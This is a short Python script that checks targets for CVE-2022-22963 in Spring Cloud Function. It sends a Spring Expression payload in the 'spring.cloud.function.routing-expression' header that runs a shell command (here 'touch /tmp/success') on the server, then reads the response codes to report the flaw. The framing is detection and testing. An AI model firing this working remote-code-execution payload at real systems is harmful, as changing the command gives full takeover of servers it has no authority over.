"""
@Author: exiashow
@File: spring_spel_code_injection.py
@Date: 2024/3/5 12:01
@Desc: CVE-2022-22963, Remote code execution in Spring Cloud Function by malicious Spring Expression
@Summary: Affected Spring Products and Versions
            Spring Cloud Function
            3.1.6
            3.2.2
            Older, unsupported versions are also affected
            Mitigation
            Users of affected versions should upgrade to 3.1.7, 3.2.3. No other steps are necessary. Releases that have fixed this issue include:
            Spring Cloud Function
            3.1.7
            3.2.3
"""

import requests
import sys

class SpringSpellCodeInjection(object):
    def __init__(self, url):
        self.url = url

    def req1(self):
        path = ":8080/functionRouter"
        data = "test"
        headers = {
            'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        response1 = requests.post(self.url + path, data=data, headers=headers)
        return response1.status_code

    def req2(self):
        path = ":8080/uppercase"
        response2 = requests.post(self.url + path)
        return response2.status_code

    def run(self):
        try:
            if self.req1() == 500 and self.req2() == 200:
                return "[Warning] Java Spring vulnerability discovered: CVE-2022-22963"
            else:
                return None
        except requests.exceptions.ConnectionError:
            pass


if __name__ == '__main__':
    fallingSword = SpringSpellCodeInjection(sys.argv[1])
    fallingSword.run()